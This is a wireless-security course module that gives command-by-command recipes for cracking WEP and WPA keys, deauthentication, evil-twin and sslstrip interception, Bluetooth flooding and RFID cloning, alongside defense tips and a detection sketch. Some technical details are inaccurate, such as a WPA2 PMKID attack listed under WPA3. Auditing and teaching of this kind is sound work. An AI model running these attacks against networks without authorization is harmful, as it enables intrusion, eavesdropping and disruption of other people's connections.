# Module 8: Wireless Security

## Overview

This module covers wireless network security - understanding WiFi protocols, penetration testing, and defense strategies. Learn to audit wireless networks legally and effectively.

---

## 8.1 Wireless Fundamentals

### WiFi Standards

```
WiFi Generations
────────────────

┌────────┬──────────┬──────────┬─────────┐
│ Standard│  Band    │ Max Speed│ Year   │
├────────┼──────────┼──────────┼─────────┤
│ 802.11b│  2.4GHz  │  11 Mbps │ 1997   │
│ 802.11g│  2.4GHz  │  54 Mbps │ 2003   │
│ 802.11n│  2.4/5GHz│ 600 Mbps │ 2009   │
│ 802.11ac│  5GHz    │ 3.4 Gbps│ 2013   │
│ 802.11ax│  2.4/5GHz│ 9.6 Gbps│ 2019   │
└────────┴──────────┴──────────┴─────────┘
```

### WiFi Security Protocols

| Protocol | Security | Status |
|----------|----------|--------|
| WEP | Weak | Deprecated |
| WPA | TKIP | Deprecated |
| WPA2 | AES-CCMP | Standard |
| WPA3 | SAE | Current |

### Wireless Frequencies

```bash
# Monitor WiFi channels
iwlist wlan0 channel

# 2.4GHz channels (non-overlapping)
1, 6, 11

# 5GHz channels
36, 40, 44, 48, 149, 153, 157, 161
```

---

## 8.2 Aircrack-ng Suite

### Setting Up Monitor Mode

```bash
# Check wireless interface
iwconfig
ip link show

# Enable monitor mode
airmon-ng start wlan0

# Or using iw
ip link set wlan0 down
iw wlan0 set type monitor
ip link set wlan0 up

# Verify
iwconfig wlan0mon

# Back to managed mode
airmon-ng stop wlan0mon
```

### WiFi Discovery

```bash
# Discover networks
airodump-ng wlan0mon

# Target specific network
airodump-ng wlan0mon --channel 6 --bssid AA:BB:CC:DD:EE:FF -w capture

# Show options
# BSSID - MAC address
# PWR - Signal power
# Beacons - Beacon frames
# #Data - Data packets
# CH - Channel
# ENC - Encryption
# AUTH - Authentication
# ESSID - Network name
```

### WEP Cracking

```bash
# 1. Monitor mode
airmon-ng start wlan0

# 2. Capture packets
airodump-ng --channel 6 --bssid [AP_MAC] -w wep_capture wlan0mon

# 3. Fake authentication
aireplay-ng --fakeauth 30 -e "NetworkName" -a [AP_MAC] -h [CLIENT_MAC] wlan0mon

# 4. ARP replay
aireplay-ng --arpreplay -b [AP_MAC] -h [CLIENT_MAC] wlan0mon

# 5. Crack
aircrack-ng wep_capture-01.cap
```

### WPA/WPA2 Cracking

```bash
# 1. Capture handshake
airodump-ng --channel 6 --bssid [AP_MAC] -w handshake wlan0mon

# 2. Deauth attack (force reconnection)
aireplay-ng --deauth 10 -a [AP_MAC] -c [CLIENT_MAC] wlan0mon

# 3. Crack with wordlist
aircrack-ng -w wordlist.txt handshake-01.cap

# Using hashcat (faster)
# Convert to hccapx
cap2hccapx.bin handshake-01.cap output.hccapx
hashcat -m 2500 output.hccapx wordlist.txt
```

### WPA3 Cracking

```bash
# WPA3 vulnerabilities
# Dragonblood research shows implementation flaws

# PMKID capture
hcxpcaptool -o pmkid.txt capture.pcap

# Hashcat PMKID attack
hashcat -m 22000 pmkid.txt wordlist.txt
```

---

## 8.3 Wireless Attacks

### Rogue Access Point

```python
class RogueAP:
    """Create rogue access point"""
    
    def __init__(self):
        self.interface = "wlan0"
    
    def create_ap(self, essid, channel):
        """Create fake AP"""
        
        # Hostapd configuration
        config = f"""
interface={self.interface}
driver=nl80211
ssid={essid}
channel={channel}
hw_mode=g
"""
        
        # Save and run hostapd
        # Then set up DHCP server
        # Then redirect traffic
    
    def setup_dns_spoof(self, target_domain):
        """Setup DNS spoofing"""
        
        # Redirect to attacker machine
        pass
```

### Evil Twin Attack

```bash
# 1. Create identical AP
# 2. Use stronger signal
# 3. Deauth users from real AP
aireplay-ng --deauth 0 -a [REAL_AP_MAC] wlan0mon

# 4. Users connect to evil twin
# 5. Capture traffic/credentials
```

### Wireless MITM

```bash
# ARP spoofing over wireless
ettercap -T -i wlan0mon -M arp:remote /192.168.1.1// /192.168.1.100//

# SSL strip
sslstrip -w sslstrip.log -f

# Driftnet (image capture)
driftnet -i wlan0mon -d /tmp/images
```

---

## 8.4 WiFi Defense Strategies

### Securing Wireless Networks

```bash
# 1. Use strong encryption
# WPA3-Personal or WPA2-Enterprise

# 2. Change default credentials
# Router admin panel

# 3. Disable WPS
# Can be brute-forced

# 4. Update firmware
# Regular updates

# 5. MAC filtering (optional)
# Not secure alone

# 6. Network segmentation
# Guest network isolation

# 7. Monitor for rogue APs
# Use tools like WIDS
```

### Wireless Intrusion Detection

```python
class WirelessIDS:
    """Detect wireless attacks"""
    
    def __init__(self):
        self.known_aps = {}
        self.alerts = []
    
    def monitor(self):
        """Monitor wireless traffic"""
        
        # Detect deauth floods
        # Detect rogue APs
        # Detect evil twins
        # Detect karma attacks
    
    def detect_deauth_flood(self, packets):
        """Detect deauthentication attack"""
        
        deauth_count = sum(1 for p in packets if p.type == 0x0c)
        
        if deauth_count > 10:  # Threshold
            self.alerts.append("Deauth flood detected!")
    
    def detect_rogue_ap(self, ssid, bssid):
        """Detect rogue access point"""
        
        # Check if AP is authorized
        if bssid not in self.known_aps:
            return True
        
        return False
```

---

## 8.5 Bluetooth Security

### Bluetooth Enumeration

```bash
# Check Bluetooth
hciconfig

# Scan for devices
hcitool scan
bluetoothctl
scan on

# List services
sdptool browse [MAC]

# RFCOMM scanning
rfcomm scan

# BlueZ tools
l2ping [MAC]
```

### Bluetooth Attacks

```bash
# BlueZ vulnerabilities
# BlueSnarfing - Extract contacts/calendar
bluez-simple-agent hci0 [MAC]

# OBEX file transfer
obexftp -b [MAC] -g contact.vcf

# BlueBug (older phones)
# Serial port access

# Flooding
l2ping -i hci0 -f [MAC]
```

### Bluetooth Defense

```bash
# 1. Disable Bluetooth when not in use
# 2. Set device to non-discoverable
# 3. Don't accept unknown pairings
# 4. Keep firmware updated
# 5. Use encryption
```

---

## 8.6 RFID Security

### RFID Basics

```bash
# Proxmark3 commands
# Read RFID tags
proxmark3> hf search

# Clone RFID
proxmark3> hf mf dump
proxmark3> hf mf restore

# Analyze
proxmark3> hf list
```

### RFID Attacks

```bash
# MFClassic clone
proxmark3> hf mf mifare

# Nested attack
proxmark3> hf mf nested

# Hardnested attack
proxmark3> hf mf hardnested
```

---

## 8.7 Hands-On Lab

### Lab 8.1: Wireless Assessment

```python
#!/usr/bin/env python3
"""Simple wireless network scanner"""

import subprocess

class WirelessScanner:
    def __init__(self):
        self.interface = "wlan0mon"
    
    def scan_networks(self):
        """Scan for wireless networks"""
        
        # Run airodump
        result = subprocess.run(
            ["airodump-ng", self.interface],
            capture_output=True,
            text=True
        )
        
        # Parse output
        networks = []
        
        for line in result.stdout.split('\n'):
            if 'WPA' in line or 'WEP' in line:
                # Parse network info
                pass
        
        return networks
    
    def check_security(self, network):
        """Check network security"""
        
        security = {
            'wep': 'CRITICAL - WEP is deprecated',
            'wpa': 'WARNING - WPA is deprecated',
            'wpa2': 'OK - Current standard',
            'wpa3': 'EXCELLENT - Latest standard'
        }
        
        return security.get(network['encryption'], 'Unknown')

if __name__ == "__main__":
    scanner = WirelessScanner()
    networks = scanner.scan_networks()
    
    for net in networks:
        print(f"{net['essid']}: {net['encryption']}")
```

---

## Module 8 Summary

### Key Takeaways

1. **WiFi standards** evolved from WEP to WPA3
2. **Aircrack-ng** enables wireless auditing
3. **WPA2/WPA3** require different attack approaches
4. **Defense** uses strong encryption and monitoring
5. **Bluetooth/RFID** have their own vulnerabilities

### Tools Summary

| Tool | Purpose |
|------|---------|
| airmon-ng | Monitor mode |
| airodump-ng | Network discovery |
| aireplay-ng | Packet injection |
| aircrack-ng | WEP/WPA cracking |
| hostapd | Create fake APs |

### Next Steps

Proceed to **Module 9: Cryptography** to understand encryption fundamentals.

---

## Quick Reference

```bash
# Start monitor mode
airmon-ng start wlan0

# Discover networks
airodump-ng wlan0mon

# Capture handshake
airodump-ng -c 6 --bssid [MAC] -w capture wlan0mon

# Deauth
aireplay-ng --deauth 10 -a [AP_MAC] wlan0mon

# Crack
aircrack-ng -w wordlist.txt capture.cap
```
